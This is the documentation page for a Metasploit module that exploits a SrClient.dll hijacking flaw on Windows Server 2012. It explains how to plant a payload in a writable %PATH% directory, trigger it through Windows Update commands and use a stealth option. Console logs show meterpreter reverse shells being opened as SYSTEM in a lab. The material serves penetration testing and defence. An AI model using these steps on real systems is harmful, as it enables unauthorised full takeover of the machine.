## Vulnerable Application

All editions of Windows Server 2012 (but not 2012 R2) are vulnerable to DLL hijacking due to the way `TiWorker.exe` will try to call the
non-existent `SrClient.dll` file when Windows Update checks for updates.
This issue can be leveraged for privilege escalation if %PATH% includes directories that are writable by low-privileged users.
The attack can be triggered by any low-privileged user and does not require a system reboot.

If run with default settings, the module will enumerate the %PATH% directories and try to find one that is writable by the current user.
Alternatively, a specific %PATH% directory can be provided via the `WRITABLE_PATH_DIR` option.
If a writable %PATH% directory is found, the module will write the payload with the name `SrClient.dll` to the vulnerable directory.

Next, the module will try to obtain the Windows Update configuration.
If Windows Update is not set to never check for updates, the module will use  the `WUAUCLT /DetectNow` command to trigger the payload.
This command will instruct Windows Update to detect and download available updates in the background.
If Windows Update is set to never check for updates, `WUAUCLT /DetectNow` will not work,
and the module will trigger the payload via the `WUAUCLT /SelfUpdateManaged` command.
This command launches the Windows Update window in the Control Panel and tells it to start checking for updates using
Windows Server Update Services (WSUS).
If stealth is required, you can set the `STEALTH_ONLY` option to prevent the module from proceeding with exploitation in this scenario.
If the module fails to obtain the Windows Update configuration, it will use `WUAUCLT /SelfUpdateManaged` to trigger the payload
unless the `STEALTH_ONLY` option is set. In the latter case, it will use the `WUAUCLT /DetectNow` command.

This exploit has several limitations
- The attack won't work when Windows Update is already checking for/downloading/installing updates on the target
- The attack won't work twice in a row, at least not in quick succession (because the attack causes Windows Update to check for updates)

If the module completes, but no session is created, check if `TiWorker.exe` is running on the target. If so, you have several options:
- Wait until `TiWorker.exe` is no longer running before launching the module again.
- Set `Wfsdelay` to a rather long period (at least half an hour), and run the module again.
- Reboot the machine if you have persistence on the target and the current user has shutdown privileges
(not recommended in a real world environment)

This module has been successfully tested on Windows Server 2012 (x64).

Windows Server 2012 VM images are available at the Microsoft Evaluation Center
[here](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2012).

## Verification Steps
1. Start msfconsole
2. Do: `use modules/exploit/windows/local/srclient_dll_hijacking`
3. Do: `set SESSION [SESSION ID]`
4. Do: `run`

## Options
### WRITABLE_PATH_DIR
The full path to a writable %PATH% directory to write the payload to. If this is not set,
the module will enumerate the %PATH% directories and try to find one that is writable by the current user.
### STEALTH_ONLY
If this is enabled, the module will only exploit the target if this is possible by triggering the payload via the
`WUAUCLT /DetectNow` command, which will launch Windows Update in the background.
This means that exploitation will not proceed if Windows Update is set to never check for updates on the target.
### WAIT_FOR_TOWORKER
The number of minutes to wait for TiWorker.exe to finish running if it is already active (because the exploit won't work if it is).
The default value is 0.

## Scenarios
### Windows 2012 x64 - %PATH% enumeration (default) with Verbose set to true
```
msf6 exploit(windows/local/srclient_dll_hijacking) > sessions

Active sessions
===============

  Id  Name  Type                     Information                               Connection
  --  ----  ----                     -----------                               ----------
  3         meterpreter x64/windows  WIN-FCDUOQDT1NB\wynter @ WIN-FCDUOQDT1NB  192.168.91.12:8443 -> 192.168.91.16:49157 (192.168.91.16)

msf6 exploit(windows/local/srclient_dll_hijacking) > show options 

Module options (exploit/windows/local/srclient_dll_hijacking):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   SESSION            3                yes       The session to run this module on.
   STEALTH_ONLY       false            no        Only exploit if the payload can be triggered without launching the Windows Update UI)
   WAIT_FOR_TIWORKER  0                no        No. of minutes to wait for TiWorker.exe to finish running if it is already active.
   WRITABLE_PATH_DIR                   no        Path to a writable %PATH% directory to write the payload to.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.91.12    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Windows Server 2012 (x64)


msf6 exploit(windows/local/srclient_dll_hijacking) > run

[*] Started reverse TCP handler on 192.168.91.12:4444 
[*] Executing automatic check (disable AutoCheck to override)
[*] Target is Windows 2012 (6.2 Build 9200).
[*] Obtaining group information for the current user WIN-FCDUOQDT1NB\wynter...
[*] 
[*]     Everyone
[*]     BUILTIN\Users
[*]     NT AUTHORITY\INTERACTIVE
[*]     CONSOLE LOGON
[*]     NT AUTHORITY\Authenticated Users
[*]     NT AUTHORITY\This Organization
[*]     NT AUTHORITY\Local account
[*]     LOCAL
[*]     NT AUTHORITY\NTLM Authentication
[*] 
[*] Checking for writable directories in %PATH%...
[*] 
[*]     Checking permissions for C:\Windows\system32
[*]     Checking permissions for C:\Windows
[*]     Checking permissions for C:\Windows\System32\Wbem
[*]     Checking permissions for C:\Windows\System32\WindowsPowerShell\v1.0\
[*]     Checking permissions for C:\wynter
[*] 
[+] WIN-FCDUOQDT1NB\wynter has write permissions to the following %PATH% directories:
[*] 
[*]     C:\wynter
[*] 
[+] The target appears to be vulnerable.
[*] Writing 5120 bytes to C:\wynter\SrClient.dll...
[*] Trying to trigger the payload in the background via the shell command `wuauclt /detectnow`
[*] Sending stage (201283 bytes) to 192.168.91.16
[*] Meterpreter session 4 opened (192.168.91.12:4444 -> 192.168.91.16:49159) at 2021-02-16 08:59:24 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
### Windows 2012 x64 - WRITABLE_PATH_DIR option set, Verbose set to false
```
msf6 exploit(windows/local/srclient_dll_hijacking) > sessions

Active sessions
===============

  Id  Name  Type                     Information                               Connection
  --  ----  ----                     -----------                               ----------
  8         meterpreter x64/windows  WIN-FCDUOQDT1NB\wynter @ WIN-FCDUOQDT1NB  192.168.91.12:8443 -> 192.168.91.16:49158 (192.168.91.16)

msf6 exploit(windows/local/srclient_dll_hijacking) > show options 

Module options (exploit/windows/local/srclient_dll_hijacking):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   SESSION            8                yes       The session to run this module on.
   STEALTH_ONLY       false            no        Only exploit if the payload can be triggered without launching the Windows Update UI)
   WAIT_FOR_TIWORKER  0                no        No. of minutes to wait for  TiWorker.exe to finish running if it is already active.
   WRITABLE_PATH_DIR  c:\wynter        no        Path to a writable %PATH% directory to write the payload to.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.91.12    yes       The listen address (an interface may be specified)
   LPORT     5555             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Windows Server 2012 (x64)


msf6 exploit(windows/local/srclient_dll_hijacking) > run

[*] Started reverse TCP handler on 192.168.91.12:5555 
[*] Executing automatic check (disable AutoCheck to override)
[*] Target is Windows 2012 (6.2 Build 9200).
[*] Obtaining group information for the current user WIN-FCDUOQDT1NB\wynter...
[*] 
[*] Checking for writable directories in %PATH%...
[*] 
[+] WIN-FCDUOQDT1NB\wynter has write permissions to c:\wynter
[+] The target appears to be vulnerable.
[*] Writing 5120 bytes to C:\wynter\SrClient.dll...
[!] Because Windows Update is set to never check for updates, triggering the payload requires launching the Windows Update window on the target.
[*] Trying to trigger the payload via the shell command `wuauclt /selfupdatemanaged`
[*] Sending stage (201283 bytes) to 192.168.91.16
[*] Meterpreter session 9 opened (192.168.91.12:5555 -> 192.168.91.16:49160) at 2021-02-16 09:12:28 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```
